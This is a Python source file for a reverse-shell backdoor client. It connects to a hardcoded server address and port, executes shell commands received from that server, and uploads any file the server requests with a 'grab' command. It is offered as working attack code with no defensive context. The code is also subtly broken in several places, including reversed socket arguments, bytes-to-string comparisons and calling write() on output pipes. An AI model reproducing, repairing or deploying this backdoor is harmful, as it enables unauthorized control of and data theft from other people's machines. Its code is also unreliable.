import subprocess
import os
import socket
import sys


def transfer(client, command):
    try:
        file_name = command.split("*")[1]
        if os.path.exists(file_name):
            with open(file_name, "rb") as file:
                while True:
                    bits = file.read(1024)
                    if not bits:
                        break
                    client.send(bits)
                client.send("DONE".encode())
        else:
            client.send("Unable to find out the file".encode())
    except Exception as e:
        sys.stderr.write("Error Occurred {}".format(e))


def connect(server_ip, server_port):
    with socket.socket(socket.SOCK_STREAM, socket.AF_INET) as client:
        try:
            client.connect((server_ip, server_port))
            print("Connected to {}:{}", format(server_ip, server_port))
            while True:
                try:
                    command = client.recv(1024)
                    if command.strip() == "exit":
                        client.close()
                        break
                    elif command.startswith("grab"):
                        transfer(client, command.decode())
                    else:
                        CMD = subprocess.Popen(
                            command.decode(),
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                        )
                        client.send(CMD.stdout.write())
                        client.send(CMD.stderr.write())
                except Exception as e:
                    sys.stderr.write("Error Occurred {}".format(e))
        except KeyboardInterrupt:
            sys.exit()
        except Exception as e:
            sys.stderr.write("Error Occured: {}".format(e))


def main():
    server_ip = "192.168.1.13"
    server_port = 9999
    connect(server_ip, server_port)


if __name__ == "__main__":
    main()
